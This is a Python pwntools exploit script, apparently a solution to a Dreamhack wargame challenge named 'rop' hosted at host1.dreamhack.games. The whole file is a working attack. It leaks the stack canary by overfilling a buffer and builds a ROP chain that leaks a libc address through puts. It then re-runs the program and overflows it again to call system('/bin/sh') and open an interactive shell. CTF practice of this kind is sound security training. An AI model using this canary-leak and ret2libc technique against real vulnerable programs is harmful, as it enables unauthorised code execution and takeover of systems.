#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']

is_local = False
if is_local:
    # r = process("./rop", env={'LD_PRELOAD': './libc-2.27.so'}) # doesn't work
    r = process("./rop")
    elf_libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
else:
    r = remote("host1.dreamhack.games", 9887)
    elf_libc = ELF("./libc-2.27.so")

elf_bin = ELF("./rop")

def buf_filler():
    # Objdump for finding offsets
    buf_offset = 0x40
    canary_offset = 0x8
    return b'A' * (buf_offset - canary_offset)

# Leak canary
filler = buf_filler() + b'B' # Pray that canary starts with null
r.sendafter(b"Buf: ", filler)
r.recvuntil(b"Buf: ")
# Recv longer in case canary contains newline
buf_data = r.recvuntil(b"[2] Input").rpartition(b"\n")[0]
canary = b'\x00' + buf_data[len(filler):]

info(f"Leaked canary: {canary} of length {len(canary)}")
if len(canary) != 8:
    warn("Canary is not 8 bytes")
    canary = canary[:8]

# Prepare payload
payload = buf_filler()
payload += canary
payload += b"B" * 8 # Overwrite RBP

# Build ROP for puts(&func_name)
# puts() can be used because it exists inside the target binary
func_name = "__libc_start_main"
got_addr = elf_bin.got["setvbuf"]
rop = ROP(elf_bin)
rop.raw(rop.rdi) # Function call 1
rop.raw(elf_bin.symbols[func_name]) # Value to be popped into rdi
rop.raw(elf_bin.plt["puts"]) # Function call 2

# rop.raw(rop.rdi)
# rop.raw(0)
# rop.raw(rop.rsi) # pop rsi + pop r15
# rop.raw(got_addr)
# rop.raw(64)
# rop.raw(elf_bin.plt["read"]) # cannot set rdx since no gadget

rop.raw(elf_bin.symbols["_start"]) # Re-run the program from the start

debug(f"stack from rop:\n{rop.dump()}")
# gdb.attach(r)

# Leak libc address
payload += rop.chain()
r.recvuntil(b"Buf: ")
r.send(payload)
leak_data = r.recvline(keepends=False)
func_addr = unpack(leak_data, 'all', sign=False, endian='little')

info(f"Leaked libc address: {leak_data} of length {len(leak_data)}")
info(f"Converted to address: {hex(func_addr)}")

# Update libc address info
libc_base = func_addr - elf_libc.symbols[func_name]
elf_libc.address = libc_base
info(f"Set libc base to {hex(libc_base)}")

#
# Re-running the program from the _start
#

# Leak canary again - it should still be the same
filler = buf_filler() + b'B'
r.sendafter(b"Buf: ", filler)
r.recvuntil(b"Buf: ")
buf_data = r.recvuntil(b"[2] Input").rpartition(b"\n")[0]
canary = b'\x00' + buf_data[len(filler):]

info(f"Leaked canary 2: {canary} of length {len(canary)}")
if len(canary) != 8:
    warn("Canary is not 8 bytes")
    canary = canary[:8]

# Prepare payload for invoking shell
rop = ROP(elf_bin) # Reset chain
rop.raw(buf_filler())
rop.raw(canary)
rop.raw(b"B" * 8) # Overwrite RBP

# gdb.attach(r)

# Call system("/bin/sh")
str_addr = next(elf_libc.search(b"/bin/sh"))
sys_addr = elf_libc.symbols["system"]
info(f"sys addr = {hex(sys_addr)}")
rop.raw(rop.rdi)
rop.raw(str_addr)
rop.raw(rop.find_gadget(['ret'])) # For 16bit-alignment
rop.raw(sys_addr)

debug(f"stack from rop:\n{rop.dump()}")

payload = rop.chain()
r.send(payload)
print(r.recv())

# Now program is waiting for input
r.interactive()
